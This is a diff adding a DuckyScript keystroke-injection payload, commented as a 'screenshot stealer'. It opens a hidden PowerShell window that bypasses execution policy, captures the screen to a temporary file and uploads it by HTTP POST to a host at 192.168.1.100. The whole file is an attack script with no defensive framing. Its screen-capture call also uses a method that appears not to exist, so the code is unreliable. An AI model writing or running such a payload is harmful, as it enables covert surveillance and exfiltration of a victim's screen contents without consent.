@@ -1,0 +1,18 @@
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 1000
+REM Screenshot stealer
+STRING Add-Type -AssemblyName System.Windows.Forms
+ENTER
+DELAY 500
+STRING $Screenshot = [System.Windows.Forms.ScreenCapture]::CaptureScreen()
+ENTER
+DELAY 500
+STRING $Screenshot.Save("$env:TEMP\screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
+ENTER
+DELAY 500
+STRING Invoke-WebRequest -Uri "http://192.168.1.100/upload" -Method POST -InFile "$env:TEMP\screenshot.png"
+ENTER
